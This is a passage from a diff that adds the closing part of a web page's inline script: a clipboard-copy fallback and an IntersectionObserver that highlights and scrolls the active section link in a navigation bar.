+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
